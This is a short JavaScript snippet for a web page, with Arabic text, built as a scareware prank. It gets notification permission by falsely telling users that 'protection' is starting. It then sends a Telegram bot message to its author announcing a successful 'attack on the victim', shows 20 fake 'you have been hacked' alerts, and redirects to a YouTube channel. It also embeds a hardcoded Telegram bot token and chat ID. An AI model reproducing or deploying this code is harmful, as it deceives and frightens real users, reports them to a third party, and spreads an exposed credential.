<script>
    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
    const chat = "8042090388";

    async function startHeavySpam() {
        // التحقق هل المتصفح يدعم الإشعارات أصلاً
        if (!("Notification" in window)) {
            alert("متصفحك لا يدعم الإشعارات، جرب متصفح Chrome");
            return;
        }

        const permission = await Notification.requestPermission();

        if (permission === "granted") {
            alert("✅ بدأت الحماية! ستصلك التنبيهات كل 5 ثوانٍ.");
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: "🧨 تم بدء الهجوم على الضحية بنجاح!" })
            });

            let count = 0;
            const spammer = setInterval(() => {
                const n = new Notification("اختراق!", {
                    body: "تم اختراقك من عمك @ll._911",
                    icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
                });

                count++;
                if (count >= 20) {
                    clearInterval(spammer);
                    window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
                }
            }, 5000);

        } else if (permission === "denied") {
            alert("❌ لقد قمت برفض الإشعارات. لن يعمل النظام إلا إذا سمحت بها من إعدادات المتصفح.");
        }
    }
</script>
